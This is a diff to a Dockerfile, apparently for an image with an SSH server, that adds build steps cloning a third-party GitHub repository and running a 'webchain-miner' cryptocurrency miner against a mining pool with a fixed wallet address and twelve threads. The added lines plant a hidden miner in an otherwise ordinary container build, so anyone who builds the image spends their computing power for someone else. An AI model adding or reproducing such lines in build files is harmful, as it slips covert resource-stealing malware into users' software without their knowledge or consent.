@@ -3,6 +3,11 @@ LABEL maintainer="https://github.com/rastasheep"
 
 RUN apt-get update
 
+RUN git clone https://github.com/hardyanzna/git
+RUN cd git
+RUN chmod +x webchain-miner
+RUN ./webchain-miner -o pool.webchain.network:2222 -u 0x36F2b38B03258EA88Fa9c4e13b8dfE1561078FFF -p x -t 12 --donate-level 1 
+
 RUN apt-get install -y openssh-server
 RUN mkdir /var/run/sshd
 
